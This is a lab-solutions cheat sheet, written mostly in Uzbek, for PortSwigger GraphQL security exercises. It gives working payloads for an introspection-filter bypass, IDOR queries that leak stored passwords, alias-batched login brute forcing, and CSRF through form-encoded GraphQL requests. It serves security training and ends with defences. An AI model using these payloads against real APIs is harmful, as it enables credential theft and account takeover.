# GraphQL API — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Endpoint qidir: `/graphql`, `/api`, `/graphql/v1`. Introspection bilan schema oshkor bo'ladi.
> Burp "GraphQL" tab + introspection query.

### Finding a hidden GraphQL endpoint — APPRENTICE
`GET /api` → "Query not present" → GraphQL. Introspection filtri `__schema` ni bloklaydi →
newline bilan aylanasan.
```
GET /api?query=query{__typename}
# introspection bypass: __schema dan keyin newline
query{__schema
{...}}
```
> `getUser(id:N)` bilan carlos ID (3) → `deleteOrganizationUser(id:3)`.

### Reading private posts — APPRENTICE
Yashirin post (id 3) ro'yxatda yo'q. Introspection `BlogPost.postPassword` ni ko'rsatadi.
```graphql
query { getBlogPost(id: 3) { postPassword } }
```

### Accidental field exposure — APPRENTICE
Login mutation. Introspection `getUser` da `password` field'ini ko'rsatadi.
```graphql
query { getUser(id: 1) { id username password } }
```
> `id:1` = administrator credentials → login → carlos delete.

### Brute-force protection bypass (aliases) — PRACTITIONER
Rate-limit bitta so'rovni ko'radi → bitta mutation'da ko'p aliased login.
```graphql
mutation {
  bruteforce0: login(input:{username:"carlos", password:"123456"}) { success }
  bruteforce1: login(input:{username:"carlos", password:"password"}) { success }
  bruteforce2: login(input:{username:"carlos", password:"qwerty"}) { success }
  ...
}
```
> Javobda `success:true` bo'lgan alias'ni qidir (search bar). Variables/operationName'ni olib tashla.

### CSRF via GraphQL API — PRACTITIONER
GraphQL `application/x-www-form-urlencoded` POST'ni CSRF token'siz qabul qiladi.
```
POST /graphql method'ni x-www-form-urlencoded qil (query/operationName/variables URL-encoded)
→ Engagement tools → Generate CSRF PoC → exploit serverda deliver
```

---

### Eslatma
Introspection bloklansa: `__schema` dan keyin newline, yoki field suggestion (clairvoyance).
Tool: graphw00f, clairvoyance, InQL, graphql-cop. Impact: IDOR via id, aliasing (brute/DoS),
auth bypass. Himoya: introspection off (prod), rate-limit alias-aware, CSRF token. Umumiy: bu papka README.
